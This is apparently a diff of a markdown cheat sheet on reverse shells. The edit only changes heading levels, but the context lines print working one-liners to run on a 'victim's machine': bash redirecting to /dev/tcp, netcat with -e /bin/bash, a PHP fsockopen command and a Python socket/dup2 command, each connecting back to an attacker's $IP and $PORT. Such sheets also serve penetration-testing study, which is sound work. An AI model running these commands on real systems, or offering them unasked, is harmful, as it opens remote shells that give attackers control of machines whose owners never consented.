@@ -41,7 +41,7 @@ We have to enter this command in the victim's machine
 bash -i >& /dev/tcp/$IP/$PORT 0>&1
 ```
 
-## Netcat
+### Netcat
 
 If netcat is installed in the victmim's machine we can also got a reverse shell
 ```bash
@@ -50,14 +50,14 @@ nc -nv $IP $PORT -e /bin/bash
 ```
 Either of this two commands will work.
 
-## PHP
+### PHP
 
 If we have php installed on the victim's machine we can:
 ```php
  php -r '$sock=fsockopen("$IP",$PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-## Python
+### Python
 ```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
